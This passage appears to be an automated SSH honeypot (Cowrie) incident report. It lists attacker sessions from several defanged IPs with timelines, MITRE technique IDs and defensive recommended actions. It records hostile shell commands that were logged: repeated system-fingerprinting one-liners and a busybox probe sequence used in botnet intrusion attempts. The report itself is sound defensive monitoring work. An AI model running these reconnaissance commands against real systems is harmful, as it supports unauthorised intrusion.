| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 09:21:28` | `cowrie.session.connect` |
| `2026-09-05 09:21:28` | `cowrie.client.version` |
| `2026-09-05 09:21:29` | `cowrie.client.kex` |
| `2026-09-05 09:21:30` | `cowrie.login.success` |
| `2026-09-05 09:21:30` | `cowrie.direct-tcpip.request` |
| `2026-09-05 09:21:30` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-05 09:21:30` | `cowrie.direct-tcpip.data` |
| `2026-09-05 09:21:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65f74d91588b

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-09-05 09:22 |
| **Last Seen** | 2026-09-05 09:22 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 09:22:19` | `cowrie.session.connect` |
| `2026-09-05 09:22:20` | `cowrie.client.version` |
| `2026-09-05 09:22:20` | `cowrie.client.kex` |
| `2026-09-05 09:22:27` | `cowrie.login.success` |
| `2026-09-05 09:22:31` | `cowrie.session.params` |
| `2026-09-05 09:22:31` | `cowrie.command.input` |
| `2026-09-05 09:22:31` | `cowrie.command.input` |
| `2026-09-05 09:22:31` | `cowrie.command.input` |
| `2026-09-05 09:22:31` | `cowrie.command.input` |
| `2026-09-05 09:22:31` | `cowrie.command.input` |
| `2026-09-05 09:22:31` | `cowrie.command.success` |
| `2026-09-05 09:22:31` | `cowrie.command.input` |
| `2026-09-05 09:22:31` | `cowrie.command.input` |
| `2026-09-05 09:22:31` | `cowrie.command.input` |
| `2026-09-05 09:22:31` | `cowrie.command.input` |
| `2026-09-05 09:22:32` | `cowrie.log.closed` |
| `2026-09-05 09:22:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38480857f09e

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-09-05 09:23 |
| **Last Seen** | 2026-09-05 09:23 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 09:23:34` | `cowrie.session.connect` |
| `2026-09-05 09:23:35` | `cowrie.client.version` |
| `2026-09-05 09:23:35` | `cowrie.client.kex` |
| `2026-09-05 09:23:40` | `cowrie.login.success` |
| `2026-09-05 09:23:44` | `cowrie.session.params` |
| `2026-09-05 09:23:44` | `cowrie.command.input` |
| `2026-09-05 09:23:44` | `cowrie.command.input` |
| `2026-09-05 09:23:44` | `cowrie.command.input` |
| `2026-09-05 09:23:44` | `cowrie.command.input` |
| `2026-09-05 09:23:44` | `cowrie.command.input` |
| `2026-09-05 09:23:44` | `cowrie.command.success` |
| `2026-09-05 09:23:44` | `cowrie.command.input` |
| `2026-09-05 09:23:44` | `cowrie.command.input` |
| `2026-09-05 09:23:44` | `cowrie.command.input` |
| `2026-09-05 09:23:44` | `cowrie.command.input` |
| `2026-09-05 09:23:46` | `cowrie.log.closed` |
| `2026-09-05 09:23:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89dfd6ab3bbf

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-09-05 09:24 |
| **Last Seen** | 2026-09-05 09:25 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 09:24:49` | `cowrie.session.connect` |
| `2026-09-05 09:24:50` | `cowrie.client.version` |
| `2026-09-05 09:24:50` | `cowrie.client.kex` |
| `2026-09-05 09:24:56` | `cowrie.login.success` |
| `2026-09-05 09:25:00` | `cowrie.session.params` |
| `2026-09-05 09:25:00` | `cowrie.command.input` |
| `2026-09-05 09:25:00` | `cowrie.command.input` |
| `2026-09-05 09:25:00` | `cowrie.command.input` |
| `2026-09-05 09:25:00` | `cowrie.command.input` |
| `2026-09-05 09:25:00` | `cowrie.command.input` |
| `2026-09-05 09:25:00` | `cowrie.command.success` |
| `2026-09-05 09:25:00` | `cowrie.command.input` |
| `2026-09-05 09:25:00` | `cowrie.command.input` |
| `2026-09-05 09:25:00` | `cowrie.command.input` |
| `2026-09-05 09:25:00` | `cowrie.command.input` |
| `2026-09-05 09:25:01` | `cowrie.log.closed` |
| `2026-09-05 09:25:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68a26cc5652b

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-09-05 09:26 |
| **Last Seen** | 2026-09-05 09:26 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 09:26:03` | `cowrie.session.connect` |
| `2026-09-05 09:26:05` | `cowrie.client.version` |
| `2026-09-05 09:26:05` | `cowrie.client.kex` |
| `2026-09-05 09:26:13` | `cowrie.login.success` |
| `2026-09-05 09:26:17` | `cowrie.session.params` |
| `2026-09-05 09:26:17` | `cowrie.command.input` |
| `2026-09-05 09:26:17` | `cowrie.command.input` |
| `2026-09-05 09:26:17` | `cowrie.command.input` |
| `2026-09-05 09:26:17` | `cowrie.command.input` |
| `2026-09-05 09:26:17` | `cowrie.command.input` |
| `2026-09-05 09:26:17` | `cowrie.command.success` |
| `2026-09-05 09:26:17` | `cowrie.command.input` |
| `2026-09-05 09:26:17` | `cowrie.command.input` |
| `2026-09-05 09:26:17` | `cowrie.command.input` |
| `2026-09-05 09:26:17` | `cowrie.command.input` |
| `2026-09-05 09:26:19` | `cowrie.log.closed` |
| `2026-09-05 09:26:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-470827ded100

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-09-05 09:27 |
| **Last Seen** | 2026-09-05 09:27 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 09:27:18` | `cowrie.session.connect` |
| `2026-09-05 09:27:19` | `cowrie.client.version` |
| `2026-09-05 09:27:19` | `cowrie.client.kex` |
| `2026-09-05 09:27:26` | `cowrie.login.success` |
| `2026-09-05 09:27:31` | `cowrie.session.params` |
| `2026-09-05 09:27:31` | `cowrie.command.input` |
| `2026-09-05 09:27:31` | `cowrie.command.input` |
| `2026-09-05 09:27:31` | `cowrie.command.input` |
| `2026-09-05 09:27:31` | `cowrie.command.input` |
| `2026-09-05 09:27:31` | `cowrie.command.input` |
| `2026-09-05 09:27:31` | `cowrie.command.success` |
| `2026-09-05 09:27:31` | `cowrie.command.input` |
| `2026-09-05 09:27:31` | `cowrie.command.input` |
| `2026-09-05 09:27:31` | `cowrie.command.input` |
| `2026-09-05 09:27:31` | `cowrie.command.input` |
| `2026-09-05 09:27:33` | `cowrie.log.closed` |
| `2026-09-05 09:27:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d1bc531a7e9

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-09-05 09:28 |
| **Last Seen** | 2026-09-05 09:28 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 09:28:32` | `cowrie.session.connect` |
| `2026-09-05 09:28:34` | `cowrie.client.version` |
| `2026-09-05 09:28:34` | `cowrie.client.kex` |
| `2026-09-05 09:28:42` | `cowrie.login.success` |
| `2026-09-05 09:28:49` | `cowrie.session.params` |
| `2026-09-05 09:28:49` | `cowrie.command.input` |
| `2026-09-05 09:28:49` | `cowrie.command.input` |
| `2026-09-05 09:28:49` | `cowrie.command.input` |
| `2026-09-05 09:28:49` | `cowrie.command.input` |
| `2026-09-05 09:28:49` | `cowrie.command.input` |
| `2026-09-05 09:28:49` | `cowrie.command.success` |
| `2026-09-05 09:28:49` | `cowrie.command.input` |
| `2026-09-05 09:28:49` | `cowrie.command.input` |
| `2026-09-05 09:28:49` | `cowrie.command.input` |
| `2026-09-05 09:28:49` | `cowrie.command.input` |
| `2026-09-05 09:28:51` | `cowrie.log.closed` |
| `2026-09-05 09:28:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b36eb65bfc5

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-05 09:32 |
| **Last Seen** | 2026-09-05 09:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 09:32:36` | `cowrie.session.connect` |
| `2026-09-05 09:32:36` | `cowrie.client.version` |
| `2026-09-05 09:32:36` | `cowrie.client.kex` |
| `2026-09-05 09:32:37` | `cowrie.login.success` |
| `2026-09-05 09:32:37` | `cowrie.direct-tcpip.request` |
| `2026-09-05 09:32:37` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-05 09:32:37` | `cowrie.direct-tcpip.data` |
| `2026-09-05 09:32:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eefdd37a6455

| Field | Detail |
|---|---|
| **Source IP** | `80.83.26[.]69` |
| **First Seen** | 2026-09-05 09:42 |
| **Last Seen** | 2026-09-05 09:43 |
| **Session Duration** | 67s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `enable, system, shell, sh, /bin/busybox TOKEN` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 09:42:49` | `cowrie.session.connect` |
| `2026-09-05 09:42:49` | `cowrie.login.success` |
| `2026-09-05 09:42:50` | `cowrie.session.params` |
| `2026-09-05 09:42:50` | `cowrie.command.input` |
| `2026-09-05 09:42:50` | `cowrie.command.failed` |
| `2026-09-05 09:42:51` | `cowrie.command.input` |
| `2026-09-05 09:42:51` | `cowrie.command.failed` |
| `2026-09-05 09:42:52` | `cowrie.command.input` |
| `2026-09-05 09:42:52` | `cowrie.command.failed` |
| `2026-09-05 09:42:53` | `cowrie.command.input` |
| `2026-09-05 09:42:55` | `cowrie.command.input` |
| `2026-09-05 09:42:55` | `cowrie.command.input` |
| `2026-09-05 09:42:55` | `cowrie.command.success` |
| `2026-09-05 09:43:05` | `cowrie.session.file_download.failed` |
| `2026-09-05 09:43:15` | `cowrie.session.file_download.failed` |
| `2026-09-05 09:43:56` | `cowrie.log.closed` |
| `2026-09-05 09:43:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.83.26[.]69` to AbuseIPDB if not already reported
- [ ] Block `80.83.26[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c98bd78c061d

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-05 09:43 |
| **Last Seen** | 2026-09-05 09:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 09:43:45` | `cowrie.session.connect` |
| `2026-09-05 09:43:45` | `cowrie.client.version` |
| `2026-09-05 09:43:45` | `cowrie.client.kex` |
| `2026-09-05 09:43:46` | `cowrie.login.success` |
| `2026-09-05 09:43:46` | `cowrie.direct-tcpip.request` |
| `2026-09-05 09:43:46` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-05 09:43:46` | `cowrie.direct-tcpip.data` |
| `2026-09-05 09:43:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2efff2adf60

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]17` |
| **First Seen** | 2026-09-05 10:13 |
| **Last Seen** | 2026-09-05 10:13 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 10:13:19` | `cowrie.session.connect` |
| `2026-09-05 10:13:19` | `cowrie.client.version` |
| `2026-09-05 10:13:20` | `cowrie.client.kex` |
| `2026-09-05 10:13:20` | `cowrie.login.success` |
| `2026-09-05 10:13:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]17` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6d588dde7a5

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]17` |
| **First Seen** | 2026-09-05 10:17 |
| **Last Seen** | 2026-09-05 10:17 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 10:17:45` | `cowrie.session.connect` |
| `2026-09-05 10:17:45` | `cowrie.client.version` |
| `2026-09-05 10:17:45` | `cowrie.client.kex` |
| `2026-09-05 10:17:46` | `cowrie.login.success` |
| `2026-09-05 10:17:46` | `cowrie.direct-tcpip.request` |
| `2026-09-05 10:17:47` | `cowrie.direct-tcpip.ja4` |
| `2026-09-05 10:17:47` | `cowrie.direct-tcpip.data` |
| `2026-09-05 10:17:48` | `cowrie.direct-tcpip.request` |
| `2026-09-05 10:17:48` | `cowrie.direct-tcpip.ja4` |
| `2026-09-05 10:17:48` | `cowrie.direct-tcpip.data` |
| `2026-09-05 10:17:49` | `cowrie.direct-tcpip.request` |
| `2026-09-05 10:17:49` | `cowrie.direct-tcpip.ja4` |
| `2026-09-05 10:17:49` | `cowrie.direct-tcpip.data` |
| `2026-09-05 10:17:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]17` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]17` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30af1daf933e

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-05 10:29 |
| **Last Seen** | 2026-09-05 10:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 10:29:07` | `cowrie.session.connect` |
| `2026-09-05 10:29:07` | `cowrie.client.version` |
| `2026-09-05 10:29:07` | `cowrie.client.kex` |
| `2026-09-05 10:29:08` | `cowrie.login.success` |
| `2026-09-05 10:29:08` | `cowrie.direct-tcpip.request` |
| `2026-09-05 10:29:08` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-05 10:29:08` | `cowrie.direct-tcpip.data` |
| `2026-09-05 10:29:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f202b6a5d644

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-05 10:30 |
| **Last Seen** | 2026-09-05 10:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 10:30:58` | `cowrie.session.connect` |
| `2026-09-05 10:30:58` | `cowrie.client.version` |
| `2026-09-05 10:30:59` | `cowrie.client.kex` |
| `2026-09-05 10:30:59` | `cowrie.login.success` |
| `2026-09-05 10:30:59` | `cowrie.direct-tcpip.request` |
| `2026-09-05 10:30:59` | `cowrie.direct-tcpip.data` |
| `2026-09-05 10:30:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2578ab864d70

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-05 10:59 |
| **Last Seen** | 2026-09-05 10:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 10:59:21` | `cowrie.session.connect` |
| `2026-09-05 10:59:21` | `cowrie.client.version` |
| `2026-09-05 10:59:21` | `cowrie.client.kex` |
| `2026-09-05 10:59:22` | `cowrie.login.success` |
| `2026-09-05 10:59:23` | `cowrie.session.params` |
| `2026-09-05 10:59:23` | `cowrie.command.input` |
| `2026-09-05 10:59:23` | `cowrie.command.input` |
| `2026-09-05 10:59:23` | `cowrie.command.input` |
| `2026-09-05 10:59:23` | `cowrie.command.input` |
| `2026-09-05 10:59:23` | `cowrie.command.input` |
| `2026-09-05 10:59:23` | `cowrie.command.success` |
| `2026-09-05 10:59:23` | `cowrie.command.input` |
| `2026-09-05 10:59:23` | `cowrie.command.input` |
| `2026-09-05 10:59:23` | `cowrie.command.input` |
| `2026-09-05 10:59:23` | `cowrie.command.input` |
| `2026-09-05 10:59:23` | `cowrie.log.closed` |
| `2026-09-05 10:59:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-128bd55f5409

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-05 11:01 |
| **Last Seen** | 2026-09-05 11:01 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 11:01:48` | `cowrie.session.connect` |
| `2026-09-05 11:01:48` | `cowrie.client.version` |
| `2026-09-05 11:01:48` | `cowrie.client.kex` |
| `2026-09-05 11:01:49` | `cowrie.login.success` |
| `2026-09-05 11:01:51` | `cowrie.session.params` |
| `2026-09-05 11:01:51` | `cowrie.command.input` |
| `2026-09-05 11:01:51` | `cowrie.command.input` |
| `2026-09-05 11:01:51` | `cowrie.command.input` |
| `2026-09-05 11:01:51` | `cowrie.command.input` |
| `2026-09-05 11:01:51` | `cowrie.command.input` |
| `2026-09-05 11:01:51` | `cowrie.command.success` |
| `2026-09-05 11:01:51` | `cowrie.command.input` |
